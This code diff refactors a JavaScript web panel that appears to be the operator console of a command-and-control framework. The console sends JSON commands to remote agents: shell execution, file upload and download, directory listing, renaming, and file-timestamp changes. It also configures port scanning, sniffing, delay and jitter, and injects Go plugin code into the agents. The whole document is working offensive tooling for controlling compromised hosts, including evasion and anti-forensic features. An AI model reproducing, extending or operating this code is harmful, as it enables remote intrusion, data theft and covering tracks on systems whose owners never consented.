@@ -3034,13 +3034,18 @@ class index{
                 this.createInput(safePortJs);
             }
         }
-        async get(command,port) {
+        async get(msg,port) {
             if(!this.uid){
                 return;
             }
             this.sendjob('agent'); // ???????????
             try {
-                const final_cmd = "shell*//*"+command;
+                const cmd = JSON.stringify({
+                    command: "shell",
+                    args: [
+                        msg
+                    ]
+                });
                 const taskid = createRuntimeTaskId("terminal");
                 const activeInput = this.currentInput && this.currentInput.isConnected
                     ? this.currentInput
@@ -3050,14 +3055,14 @@ class index{
                     "msg",
                     {
                         uid:this.uid,
-                        msg:final_cmd,
+                        msg:cmd,
                         taskid:taskid,
                         port :port,
                     }
                 );
                 if(result){
                     this.currentTaskId = taskid;
-                    const started = this.lain_time(this.uid, taskid, command);
+                    const started = this.lain_time(this.uid, taskid,msg);
                     if (!started) {
                         this.appendOutput("task polling not started");
                         return;
@@ -3131,55 +3136,96 @@ class index{
                 await this.get(command, port);
             }
         }
-        async loadFile(file_name, fileSize){
-            if(!fileSize || !file_name){
+        async loadFile(fileName, fileSize) {
+            if (!fileName || !fileSize || !this.uid) {
                 return false;
             }
-            let splitSizeInput = this.getDialogNode('#splitSize');
-            let splitSize = splitSizeInput && splitSizeInput.value
-                ? parseFloat(splitSizeInput.value) * 1024 * 1024
+
+            const splitSizeInput = this.getDialogNode("#splitSize");
+            const splitSizeMB = splitSizeInput && splitSizeInput.value
+                ? Number.parseFloat(splitSizeInput.value)
                 : 0;
-            let file_key = this.uid + "**///**" + file_name + "**///**" + splitSize;
-            let powershell = "LOAD_U_FILE*//*" + file_key;
 
-            const port = getPortByUid(this.uid);
-            const safePortJs = escapeInlineJsArg(port);
+            const splitSize = Number.isFinite(splitSizeMB) && splitSizeMB > 0
+                ? Math.floor(splitSizeMB * 1024 * 1024)
+                : 1048576;
 
-            webSocketClient.send(
-                
+            const port = String(getPortByUid(this.uid) || "").trim();
+            if (!port) {
+                customLog("Agent port not found");
+                return false;
+            }
+
+            const command = JSON.stringify({
+                command: "LOAD_U_FILE",
+                args: [
+                    String(this.uid),
+                    String(fileName),
+                    String(splitSize)
+                ]
+            });
+
+            const sent = await webSocketClient.send(
                 "msg",
                 {
-                    uid:this.uid,
-                    msg:powershell,
-                    taskid:AgentTaskId,
-                    port: safePortJs
+                    uid: String(this.uid),
+                    msg: command,
+                    taskid: AgentTaskId,
+                    port: port
                 }
             );
+
+            if (!sent) {
+                customLog("LOAD_U_FILE send failed");
+                return false;
+            }
+
             return true;
         }
-        async getFile(path){
-            if(!path){
-                return;
+        async getFile(path) {
+            if (!path || !this.uid) {
+                return false;
             }
-            let splitSizeInput = this.getDialogNode('#splitSize');
-            let splitSize = splitSizeInput && splitSizeInput.value
-                ? parseFloat(splitSizeInput.value) * 1024 * 1024
+
+            const splitSizeInput = this.getDialogNode("#splitSize");
+            const splitSizeMB = splitSizeInput && splitSizeInput.value
+                ? Number.parseFloat(splitSizeInput.value)
                 : 0;
-            let powershell = "GET_U_FILE*//*" + path + "*//*" + splitSize;
 
-            const port = getPortByUid(this.uid);
-            const safePortJs = escapeInlineJsArg(port);
+            const splitSize = Number.isFinite(splitSizeMB) && splitSizeMB > 0
+                ? Math.floor(splitSizeMB * 1024 * 1024)
+                : 1048576;
 
-            webSocketClient.send(
-                
+            const port = String(getPortByUid(this.uid) || "").trim();
+            if (!port) {
+                customLog("Agent port not found");
+                return false;
+            }
+
+            const command = JSON.stringify({
+                command: "GET_U_FILE",
+                args: [
+                    String(path),
+                    String(splitSize)
+                ]
+            });
+
+            const sent = await webSocketClient.send(
                 "msg",
                 {
-                    uid:this.uid,
-                    msg:powershell,
-                    taskid:AgentTaskId,
-                    port: safePortJs
+                    uid: String(this.uid),
+                    msg: command,
+                    taskid: AgentTaskId,
+                    port: port
                 }
             );
+
+            if (!sent) {
+                customLog("GET_U_FILE send failed");
+                return false;
+            }
+
+            return true;
         }
         renderFileList(fileContent, shell_dir) {
             const div_file = this.getDialogNode('#file_resp') || document.querySelector('#file_resp');
@@ -3319,54 +3365,102 @@ class index{
                     });
                 }
 
-                new_file.querySelector('.rename-btn')?.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    const filenameSpan = new_file.querySelector('.filename');
-                    const oldName = filenameSpan.innerText;
-                    const oldPath = new_file.dataset.path;
+                new_file.querySelector(".rename-btn")?.addEventListener(
+                    "click",
+                    async (e) => {
+                        e.stopPropagation();
+                        const filenameSpan = new_file.querySelector(".filename");
+                        if (!filenameSpan) {
+                            return;
+                        }
+                        const oldName = filenameSpan.innerText;
+                        const oldPath = new_file.dataset.path;
+                        const newName = prompt("Enter the new name:", oldName);
+                        if (!newName || newName === oldName) {
+                            return;
+                        }
+                        const lastSlash = oldPath.lastIndexOf("/");
+                        const dirPath = lastSlash >= 0
+                            ? oldPath.substring(0, lastSlash)
+                            : "";
+                        const newPath = dirPath
+                            ? dirPath + "/" + newName
+                            : newName;
+                        const command = JSON.stringify({
+                            command: "CHANG_FILE_NAME",
+                            args: [
+                                oldPath,
+                                newName
+                            ]
+                        });
+                        const port = String(getPortByUid(this.uid) || "").trim();
+                        if (!port) {
+                            customLog("Agent port not found");
+                            return;
+                        }
+                        const sent = await webSocketClient.send(
+                            "msg",
+                            {
+                                uid: String(this.uid),
+                                msg: command,
+                                taskid: AgentTaskId,
+                                port: port
+                            }
+                        );
+                        if (!sent) {
+                            customLog("CHANG_FILE_NAME send failed");
+                            return;
+                        }
+                        filenameSpan.innerText = newName;
+                        new_file.dataset.path = newPath;
+                    }
+                );
 
-                    const newName = prompt("Enter the new name:", oldName);
-                    if (!newName || newName === oldName) return;
-
-                    const lastSlash = oldPath.lastIndexOf('/');
-                    const dirPath = lastSlash >= 0 ? oldPath.substring(0, lastSlash) : '';
-                    const newPath = dirPath ? (dirPath + '/' + newName) : newName;
-                    const cmd = "CHANG_FILE_NAME*//*" + oldPath + "*//*" + newName;
-
-                    const port = getPortByUid(this.uid);
-                    const safePortJs = escapeInlineJsArg(port);
-
-                    webSocketClient.send("msg", {
-                        uid: this.uid,
-                        msg: cmd,
-                        taskid: AgentTaskId,
-                        port: safePortJs
-                    });
-                    filenameSpan.innerText = newName;
-                    new_file.dataset.path = newPath;
-                });
-
-                new_file.querySelector('.time-btn')?.addEventListener('click', (e) => {
-                    e.stopPropagation();
-
-                    const currentPath = new_file.dataset.path;
-                    const newTime = prompt("Enter the new modified time (format: YYYY-MM-DD HH:mm:ss):");
-                    if (!newTime) return;
-
-                    const cmd = "CHANG_FILE_TIME*//*" + currentPath + "*//*" + newTime;
-                    
-                    const port = getPortByUid(this.uid);
-                    const safePortJs = escapeInlineJsArg(port);
-                    
-                    webSocketClient.send("msg", {
-                        uid: this.uid,
-                        msg: cmd,
-                        taskid: AgentTaskId,
-                        port: safePortJs
-                    });
-
-                    new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
-                });
+                new_file.querySelector(".time-btn")?.addEventListener(
+                    "click",
+                    async (e) => {
+                        e.stopPropagation();
+                        const currentPath = new_file.dataset.path;
+                        if (!currentPath) {
+                            return;
+                        }
+                        const newTime = prompt(
+                            "Enter the new modified time (format: YYYY-MM-DD HH:mm:ss):"
+                        );
+                        if (!newTime) {
+                            return;
+                        }
+                        const command = JSON.stringify({
+                            command: "CHANG_FILE_TIME",
+                            args: [
+                                currentPath,
+                                newTime
+                            ]
+                        });
+                        const port = String(getPortByUid(this.uid) || "").trim();
+                        if (!port) {
+                            customLog("Agent port not found");
+                            return;
+                        }
+                        const sent = await webSocketClient.send(
+                            "msg",
+                            {
+                                uid: String(this.uid),
+                                msg: command,
+                                taskid: AgentTaskId,
+                                port: port
+                            }
+                        );
+                        if (!sent) {
+                            customLog("CHANG_FILE_TIME send failed");
+                            return;
+                        }
+                        const fileTime = new_file.querySelector(".filetime");
+                        if (fileTime) {
+                            fileTime.innerText = "<" + newTime + ">";
+                        }
+                    }
+                );
 
                 fragment.appendChild(new_file);
                 renderedCount++;
@@ -3474,26 +3568,35 @@ class index{
         }
         async look_file(dir) {
             dir = dir || this.shell_dir || "./";
-            if (!this.uid || !dir) return false;
-
+            if (!this.uid || !dir) {
+                return false;
+            }
             this.stopFileListPolling();
-
-            const powershell = "LOOK_UP_FILE*//*" + dir;
+            const command = JSON.stringify({
+                command: "LOOK_UP_FILE",
+                args: [
+                    String(dir)
+                ]
+            });
             const taskId = createRuntimeTaskId("filelist");
             this.fileListTaskId = taskId;
             this.fileListPendingDir = dir;
             this.fileListPollBusy = false;
-
             const pollOnce = async () => {
-                if (!this.canUseFileDialog(taskId) || this.fileListPollBusy) {
+                if (
+                    !this.canUseFileDialog(taskId) ||
+                    this.fileListPollBusy
+                ) {
                     return false;
                 }
-
                 this.fileListPollBusy = true;
                 try {
                     const responsePromise = webSocketClient.waitForMessage(
                         (msg) => {
-                            const sameTask = msg.taskid == null || String(msg.taskid) === String(taskId);
+                            const sameTask =
+                                msg.taskid == null ||
+                                String(msg.taskid) === String(taskId);
+
                             return this.canUseFileDialog(taskId) &&
                                 msg.path === "getFileList" &&
                                 msg.code === 200 &&
@@ -3501,23 +3604,32 @@ class index{
                                 sameTask;
                         }
                     );
-                    webSocketClient.send("getFileCache", {
-                        uid: this.uid,
-                    });
-                    const sent = await webSocketClient.send("getFileList", {
-                        uid: this.uid,
-                        taskid: taskId
-                    });
-
+                    const cacheSent = await webSocketClient.send(
+                        "getFileCache",
+                        {
+                            uid: this.uid
+                        }
+                    );
+                    if (!cacheSent) {
+                        return false;
+                    }
+                    const sent = await webSocketClient.send(
+                        "getFileList",
+                        {
+                            uid: this.uid,
+                            taskid: taskId
+                        }
+                    );
                     if (!sent) {
                         return false;
                     }
-
                     const result = await responsePromise;
-                    if (!this.canUseFileDialog(taskId) || !result) {
+                    if (
+                        !this.canUseFileDialog(taskId) ||
+                        !result
+                    ) {
                         return false;
                     }
-
                     const payload =
                         result.data ??
                         result.content ??
@@ -3525,19 +3637,19 @@ class index{
                         result.fileContent ??
                         result.list ??
                         "";
-
                     if (!String(payload || "").trim()) {
                         return false;
                     }
-
                     this.shell_dir = dir;
-                    const rendered = this.renderFileList(payload, this.shell_dir);
+                    const rendered = this.renderFileList(
+                        payload,
+                        this.shell_dir
+                    );
                     if (rendered) {
                         this.history_file(this.uid);
                         this.stopFileListPolling(taskId);
                         return true;
                     }
-
                     return false;
                 } catch (err) {
                     if (!this.canUseFileDialog(taskId)) {
@@ -3546,12 +3658,12 @@ class index{
                     if (err?.message === "wait message timeout") {
                         return false;
                     }
+                    console.error("getFileList error:", err);
                     return false;
                 } finally {
                     this.fileListPollBusy = false;
                 }
             };
-
             const loop = async () => {
                 while (this.canUseFileDialog(taskId)) {
                     const rendered = await pollOnce();
@@ -3561,30 +3673,38 @@ class index{
                     if (!this.canUseFileDialog(taskId)) {
                         break;
                     }
-                    await new Promise(r => setTimeout(r, 1200));
+                    await new Promise((resolve) => {
+                        setTimeout(resolve, 1200);
+                    });
                 }
                 this.stopFileListPolling(taskId);
             };
-
             try {
-                const port = getPortByUid(this.uid);
-                const safePortJs = escapeInlineJsArg(port);
-                const sent = await webSocketClient.send("msg", {
-                    uid: this.uid,
-                    msg: powershell,
-                    taskid: taskId,
-                    port: safePortJs
-                });
-
+                const port = String(
+                    getPortByUid(this.uid) || ""
+                ).trim();
+                if (!port) {
+                    customLog("Agent port not found");
+                    this.stopFileListPolling(taskId);
+                    return false;
+                }
+                const sent = await webSocketClient.send(
+                    "msg",
+                    {
+                        uid: String(this.uid),
+                        msg: command,
+                        taskid: taskId,
+                        port: port
+                    }
+                );
                 if (!sent) {
                     this.stopFileListPolling(taskId);
                     return false;
                 }
-
-                loop();
+                void loop();
                 return true;
             } catch (err) {
-                console.error(err);
+                console.error("LOOK_UP_FILE error:", err);
                 this.stopFileListPolling(taskId);
                 return false;
             }
@@ -3639,19 +3759,41 @@ class index{
                 cur_dir_p.textContent="Path:\t"+this.shell_dir;
             }
         }
-        switchVer(value){
-            let cmd = "SWITCH_VERSION*//*"+value;
-            const port = getPortByUid(this.uid);
-            const safePortJs = escapeInlineJsArg(port);
-            webSocketClient.send(
+        async switchVer(value) {
+            if (!this.uid || value == null) {
+                return false;
+            }
+            const version = String(value);
+            if (!version.trim()) {
+                return false;
+            }
+            const port = String(
+                getPortByUid(this.uid) || ""
+            ).trim();
+            if (!port) {
+                customLog("Agent port not found");
+                return false;
+            }
+            const command = JSON.stringify({
+                command: "SWITCH_VERSION",
+                args: [
+                    version
+                ]
+            });
+            const sent = await webSocketClient.send(
                 "msg",
                 {
-                    uid:this.uid,
-                    msg:cmd,
-                    taskid:AgentTaskId,
-                    port:safePortJs
+                    uid: String(this.uid),
+                    msg: command,
+                    taskid: AgentTaskId,
+                    port: port
                 }
             );
+            if (!sent) {
+                customLog("SWITCH_VERSION send failed");
+                return false;
+            }
+            return true;
         }
     }
     
@@ -4540,54 +4682,103 @@ class index{
             });
 
             function renderMsgText(rawMsg) {
-                let taskId = "";
-                let msgContent = rawMsg;
-                const colonIndex = rawMsg.indexOf(":");
-
-                if (colonIndex >= 0) {
-                    taskId = rawMsg.substring(0, colonIndex).trim();
-                    msgContent = rawMsg.substring(colonIndex + 1).trim();
+                let message;
+                try {
+                    message = JSON.parse(String(rawMsg ?? ""));
+                } catch (error) {
+                    console.error("Invalid command JSON:", error);
+                    return "";
                 }
-
-                const parts = msgContent.split("*//*");
-                let result = msgContent;
-
-                switch (parts[0]) {
+                if (!message ||typeof message !== "object" ||Array.isArray(message)) {
+                    return "";
+                }
+                const command = String(
+                    message.command || ""
+                ).trim();
+                const args = Array.isArray(message.args)
+                    ? message.args.map((value) => String(value ?? ""))
+                    : [];
+                const taskId = String(
+                    message.task_id || ""
+                ).trim();
+                const arg = (index) => args[index] || "";
+                let result = command;
+                switch (command) {
                     case "GET_U_FRIENDS":
-                        result = "scan: " + parts[1] + "   range: " + parts[2] + "   delay: " + parts[3];
-                        break;
-                    case "GET_DELAY":
-                        result = "change delay: " + parts[1] + " seconds";
-                        break;
-                    case "GET_U_FILE":
-                        result = "File: " + parts[1] + "   Size: " + parts[2] + " bytes";
-                        break;
-                    case "LOAD_U_FILE":
-                        result = "File: " + parts[1];
-                        break;
-                    case "LOOK_UP_FILE":
-                        result = "lookDir: " + parts[1];
+                        result =
+                            "scan: " +
+                            arg(0) +
+                            "   range: " +
+                            arg(1) +
+                            "   delay: " +
+                            arg(2);
                         break;
                     case "GET_PORTS":
-                        result = "sniff: " + parts[1] + "   range: " + parts[2] + "   delay: " + parts[3];
+                        result =
+                            "sniff: " +
+                            arg(0) +
+                            "   range: " +
+                            arg(1) +
+                            "   delay: " +
+                            arg(2);
                         break;
-                    case "SWITCH_VERSION":
-                        result = "change shell: " + parts[1];
-                        break;
-                    case "CHANG_FILE_NAME":
-                        result = "change file name: " + parts[1] + " -> " + parts[2];
-                        break;
-                    case "CHANG_FILE_TIME":
-                        result = "change file time: " + parts[1] + " -> " + parts[2];
+                    case "GET_DELAY":
+                        result =
+                            "change delay: " +
+                            arg(0) +
+                            " seconds";
                         break;
                     case "GET_JITTER":
-                        result = "change jitter: " + parts[1];
+                        result =
+                            "change jitter: " +
+                            arg(0);
+                        break;
+                    case "GET_U_FILE":
+                        result =
+                            "File: " +
+                            arg(0) +
+                            "   Size: " +
+                            arg(1) +
+                            " bytes";
+                        break;
+                    case "LOAD_U_FILE":
+                        result =
+                            "File: " +
+                            (arg(1) || arg(0));
+                        break;
+                    case "LOOK_UP_FILE":
+                        result =
+                            "lookDir: " +
+                            arg(0);
+                        break;
+                    case "SWITCH_VERSION":
+                        result =
+                            "change shell: " +
+                            arg(0);
+                        break;
+                    case "CHANG_FILE_NAME":
+                        result =
+                            "change file name: " +
+                            arg(0) +
+                            " -> " +
+                            arg(1);
+                        break;
+                    case "CHANG_FILE_TIME":
+                        result =
+                            "change file time: " +
+                            arg(0) +
+                            " -> " +
+                            arg(1);
                         break;
                     default:
-                        result = parts.join(" ");
+                        result = [command, ...args]
+                            .filter((value) => value !== "")
+                            .join(" ");
                         break;
                 }
-                return taskId ? result + "   taskid: " + taskId : result;
+                return taskId
+                    ? result + "   taskid: " + taskId
+                    : result;
             }
 
             function createMessageItem({
@@ -5719,49 +5910,57 @@ class lain_net{
         });
         restoreViewState(netDiv, viewState);
     }
-    async scan(){
-        var uid = document.getElementById('net_shell').value;
+    async scan() {
+        const uid = document.getElementById("net_shell").value;
         if (!uid) {
             customLog("Please select an agent");
             return false;
         }
-        let optionValue = document.getElementById('net_options').value; //閫夐」
-        let targetValue = document.getElementById('net_target').value; //鐩爣
-        let targetListValue = document.getElementById('net_target_list').value; //鎺㈡祴鑼冨洿
-        var sleepTimeValue = document.getElementById('net_sleep_time').value; //浼戠湢鏃堕棿
-        let customSleepTimeValue = document.getElementById('custom_sleep_time').value; //鑷畾涔夋椂闂�
-        if (sleepTimeValue === 'custom') {
+        const optionValue = document.getElementById("net_options").value;
+        const targetValue = document.getElementById("net_target").value;
+        const targetListValue = document.getElementById("net_target_list").value;
+        let sleepTimeValue = document.getElementById("net_sleep_time").value;
+        const customSleepTimeValue = document.getElementById("custom_sleep_time").value;
+        if (sleepTimeValue === "custom") {
             sleepTimeValue = customSleepTimeValue;
         }
-        console.log('Select:', optionValue);
-        console.log('IP:', targetValue);
-        console.log('Range:', targetListValue);
-        console.log('Delay:', sleepTimeValue);
-        
-        if (isNaN(sleepTimeValue) || sleepTimeValue < 1) {
-            sleepTimeValue = 1; // 榛樿鏈€灏忓€间负1
+        let sleepTime = Number(sleepTimeValue);
+        if (!Number.isFinite(sleepTime) || sleepTime < 1) {
+            sleepTime = 1;
+        } else {
+            sleepTime = Math.floor(sleepTime);
         }
-
-		let cmd;
-        if(optionValue === "scan"){
-            cmd="GET_PORTS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue;
-        }else if(optionValue === "sniff"){
-            cmd="GET_U_FRIENDS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue;
+        let command;
+        if (optionValue === "scan") {
+            command = "GET_PORTS";
+        } else if (optionValue === "sniff") {
+            command = "GET_U_FRIENDS";
         } else {
             customLog("Please select scan type");
             return false;
         }
-
-        const port = getPortByUid(uid);
-        const safePortJs = escapeInlineJsArg(port);
-
+        const commandData = JSON.stringify({
+            command: command,
+            args: [
+                String(targetValue),
+                String(targetListValue),
+                String(sleepTime)
+            ]
+        });
+        const port = String(
+            getPortByUid(uid) || ""
+        ).trim();
+        if (!port) {
+            customLog("Agent port not found");
+            return false;
+        }
         const sent = await webSocketClient.send(
             "msg",
             {
-                uid:uid,
-                msg:cmd,
-                taskid:AgentTaskId,
-                port:safePortJs
+                uid: String(uid),
+                msg: commandData,
+                taskid: AgentTaskId,
+                port: port
             }
         );
         if (!sent) {
@@ -7561,49 +7760,56 @@ function showPluginDialog(uid, os, paramDescList, codeword) {
 
     // 鍙戦€佹秷鎭嚱鏁�
     async function sendMsg() {
-        let inputs = dialog.querySelectorAll('input[type="text"]');
-        let msgParts = [];
-        for (let input of inputs) {
-            let value = input.value.trim();
+        const inputs = dialog.querySelectorAll(
+            'input[type="text"]'
+        );
+        const msgParts = [];
+        for (const input of inputs) {
+            const value = input.value.trim();
             if (!value) {
                 customAlert("Please fill in all fields.");
                 return;
             }
             msgParts.push(value);
         }
-        const port = getPortByUid(uid);
+        const port = String(
+            getPortByUid(uid) || ""
+        ).trim();
         if (!port) {
             customAlert("Agent port not found.");
             return;
         }
-
-        let msg = codeword + '*//*' + msgParts.join('*//*');
+        const command = JSON.stringify({
+            command: String(codeword),
+            args: msgParts
+        });
         try {
             const taskid = createRuntimeTaskId("plugin");
-            let result = await webSocketClient.send(
+            const sent = await webSocketClient.send(
                 "msg",
                 {
-                    uid: uid,
-                    msg: msg,
+                    uid: String(uid),
+                    msg: command,
                     taskid: taskid,
                     port: port
                 }
             );
-            if (!result) {
+            if (!sent) {
                 customAlert("Message send failed");
                 return;
             }
             customLog("Message sent successfully!");
-            inputs.forEach(input => {
-                input.value = '';
+            inputs.forEach((input) => {
+                input.value = "";
             });
-        } catch(error) {
+        } catch (error) {
             console.error(
                 "Failed to send message:",
                 error
             );
             customLog(
-                "Failed to send message: " + error.message
+                "Failed to send message: " +
+                (error?.message || String(error))
             );
         }
     }
@@ -7654,33 +7860,47 @@ async function submitPlugin(remark) {
         submitBtn.disabled = true;
     }
     try {
-        const parameterDescArray = parameterDesc.split(",").map(function(part) {
-            return part.trim();
-        }).filter(function(part) {
-            return part !== "";
-        });
+        const parameterDescArray = parameterDesc
+            .split(",")
+            .map(function(part) {
+                return part.trim();
+            })
+            .filter(function(part) {
+                return part !== "";
+            });
         while (parameterDescArray.length < parameterCount) {
             parameterDescArray.push("null");
         }
         const normalizedParameterDesc = parameterDescArray.join(",");
-        const funcParams = codeParts.map(function(part) {
-            return part + " string";
-        }).join(", ");
-        const callParams = codeParts.map(function(_, index) {
-            return "msg[" + (index + 1) + "]";
-        }).join(", ");
+        const funcParams = codeParts
+            .map(function(part) {
+                return part + " string";
+            })
+            .join(", ");
+        const callParams = codeParts
+            .map(function(_, index) {
+                return "args[" + index + "]";
+            })
+            .join(", ");
         let finalCodeBody = rawCode;
-        for (let i = 1; i <= parameterCount; i++) {
+        for (let i = 1; i <= codeParts.length; i++) {
             const regex = new RegExp("msg-" + i, "g");
-            finalCodeBody = finalCodeBody.replace(regex, "msg" + i);
+            finalCodeBody = finalCodeBody.replace(
+                regex,
+                "msg" + i
+            );
         }
-        const finalCode = 'case "' + codeWords + '":\n    go func(' +
+        const finalCode =
+            "case " +
+            JSON.stringify(String(codeWords)) +
+            ":\n" +
+            "go func(" +
             funcParams +
-            ') {' +
+            ") {" +
             finalCodeBody +
-            '}(' +
+            "}(" +
             callParams +
-            ')';
+            ")";
         const sent = await webSocketClient.send(
             "insertPlugin",
             {
@@ -7690,7 +7910,7 @@ async function submitPlugin(remark) {
                 os: osName,
                 parameter: parameter,
                 parameterDesc: normalizedParameterDesc,
-                taskid:AgentTaskId
+                taskid: AgentTaskId
             }
         );
         if (!sent) {
@@ -7704,11 +7924,12 @@ async function submitPlugin(remark) {
             parameter: parameter,
             parameterDesc: normalizedParameterDesc,
             code: finalCode,
-            taskid:AgentTaskId
+            taskid: AgentTaskId
         });
         return true;
     } catch (err) {
-        customAlert("insertPlugin failed: " + err.message);
+        console.error("insertPlugin error:", err);
+        customAlert("insertPlugin failed");
         return false;
     } finally {
         if (submitBtn) {
